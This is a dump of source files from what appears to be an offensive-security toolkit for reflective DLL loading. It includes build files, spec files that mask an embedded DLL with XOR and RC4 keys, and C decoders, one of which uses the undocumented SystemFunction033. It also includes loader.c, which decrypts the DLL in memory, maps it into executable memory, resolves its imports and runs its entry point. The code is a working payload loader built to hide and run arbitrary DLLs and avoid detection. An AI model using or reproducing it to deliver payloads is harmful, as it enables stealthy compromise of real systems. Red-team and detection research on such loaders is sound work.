    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_transforms/modules/rc4/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/recover.c -o bin/recover.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/recover.c -o bin/recover.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_transforms/modules/rc4/rc4.spec

```text
#
# rc4 data encoding module
#

# 'init' is called by loader.spec and is our opportunity to merge in code
# and set any global values we need to set.
init.x86:
	# merge in code for XOR recovery
	load "bin/recover.x86.o"
		merge

	# layer our xor recovery function over recover
	redirect "_recover" "_rc4_recover"

	# patch in the XOR key for our module too
	generate $RC4_KEY 16
	patch "_rc4key" $RC4_KEY

init.x64:
	load "bin/recover.x64.o"
		merge

	redirect "recover" "rc4_recover"

	generate $RC4_KEY 16
	patch "rc4key" $RC4_KEY

# 'apply' is called by loader.spec and is our opportunity to encode the data
apply.x86:
	mask "rc4" $RC4_KEY

apply.x64:
	mask "rc4" $RC4_KEY

```

## File: simple_rdll_transforms/modules/rc4/src/recover.c

```c
/*
 * Copyright 2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

void recover(_RESOURCE * rsrc);

/*
 * our rc4key, we're going to set this via rc4.spec
 */
const char rc4key[16] = { 1 };

/*
 * We're going to rely on an undocumented Win32 function to do the RC4 decrypt
 * https://s3cur3th1ssh1t.github.io/SystemFunction032_Shellcode/
 */
typedef struct {
	DWORD  length;
	DWORD  maxlen;
	char * buffer;
} USTRING;

WINBASEAPI LONG WINAPI ADVAPI32$SystemFunction033(USTRING * data, USTRING * key);

/*
 * our recover function, in place recovers our xor'd data
 */
void rc4_recover(_RESOURCE * rsrc) {
	USTRING     u_data;
	USTRING     u_key;

	/* call the next module */
	recover(rsrc);

	/* setup our USTRING data structures for RC4 decrypt */
	u_data.length = rsrc->length;
	u_data.buffer = rsrc->value;

	u_key.length  = 16;
	u_key.buffer  = (char *)&rc4key;

	/* call the System033 function to do an RC4 decrypt */
	ADVAPI32$SystemFunction033(&u_data, &u_key);
}

```

## File: simple_rdll_transforms/modules/rc4/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_transforms/modules/xor/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_transforms/modules/xor/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/recover.c -o bin/recover.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/recover.c -o bin/recover.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_transforms/modules/xor/xor.spec

```text
#
# xor data encoding module
#

# 'init' is called by loader.spec and is our opportunity to merge in code
# and set any global values we need to set.
init.x86:
	# merge in code for XOR recovery
	load "bin/recover.x86.o"
		merge

	# layer our xor recovery function over recover
	redirect "_recover" "_xor_recover"

	# patch in the XOR key for our module too
	generate $XOR_KEY 128
	patch "_xorkey" $XOR_KEY

init.x64:
	load "bin/recover.x64.o"
		merge

	redirect "recover" "xor_recover"

	generate $XOR_KEY 128
	patch "xorkey" $XOR_KEY

# 'apply' is called by loader.spec and is our opportunity to encode the data
apply.x86:
	mask "xor" $XOR_KEY

apply.x64:
	mask "xor" $XOR_KEY

```

## File: simple_rdll_transforms/modules/xor/src/recover.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

void recover(_RESOURCE * rsrc);

/*
 * our xorkey, we're going to set this via xor.spec
 */
const char xorkey[128] = { 1 };

/*
 * our recover function, in place recovers our xor'd data
 */
void xor_recover(_RESOURCE * rsrc) {
	/* call the next module */
	recover(rsrc);

	/* unmask with XOR key to recover data */
	for (int x = 0; x < rsrc->length; x++) {
		rsrc->value[x] ^= xorkey[x % 128];
	}
}

```

## File: simple_rdll_transforms/modules/xor/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_transforms/src/loader.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

#define memset(x, y, z) __stosb((unsigned char *)x, y, z);
#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __DLLDATA__[0] __attribute__((section("my_data")));

/*
 * This is an empty function, but we will use redirect to LAYER recovery transforms over it.
 *
 * NOTE: gcc with -O1 likes to inline some functions and an empty or minimal function is a prime candidate for
 * inlining. I'm using noinline to prevent that tragedy, because if a function is inlined, we can't redirect it
 */
void __attribute__((noinline)) recover(_RESOURCE * rsrc) {
	/*
	 * And, in the fighting the optimizer department, -O1 likes to also not call a function it believes has
	 * no side-effects. So, we stick this here to say GCC LEAVE MY EMPTY FUNCTION ALONE!
	 */
	__asm__ __volatile__("");
}

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void go() {
	char       * dst;
	char       * src;
	DLLDATA      data;
	IMPORTFUNCS  funcs;
	_RESOURCE  * rsrc = (_RESOURCE *)__DLLDATA__;
	_RESOURCE  * rsrc_rw;

	/* allocate read/write memory for our encoded/masked DLL
	 *
	 * Note: we're using a generous 4MB buffer because with all of the different transforms you can chain
	 * together... it's hard to know the max size of each intermediate stage (compression modules threw this
	 * predictability out the window). */
	rsrc_rw = (_RESOURCE *)KERNEL32$VirtualAlloc(NULL, 4 * 1024 * 1024, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

	/* copy our encoded/masked DLL data to read/write memory. */
	memcpy(rsrc_rw, rsrc, rsrc->length + 4);

	/* apply our layered transforms (decoders) to recover our DLL data */
	recover(rsrc_rw);

	/* find our DLL appended to this PIC */
	src = (char *)rsrc_rw->value;

	/* parse our DLL! */
	ParseDLL(src, &data);

	/* allocate memory for it! */
	dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	/* load the damned thing */
	LoadDLL(&data, src, dst);

	/* setup our IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* process the imports */
	ProcessImports(&funcs, &data, dst);

	/* get our entry point */
	DLLMAIN_FUNC dllEntry = EntryPoint(&data, dst);

	/* we can free the intermediate decoded stage now */
	KERNEL32$VirtualFree(rsrc_rw, 0, MEM_RELEASE);

	/* pass execution to our DLL */
	dllEntry((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
}

```

## File: simple_rdll_transforms/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_unwind/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
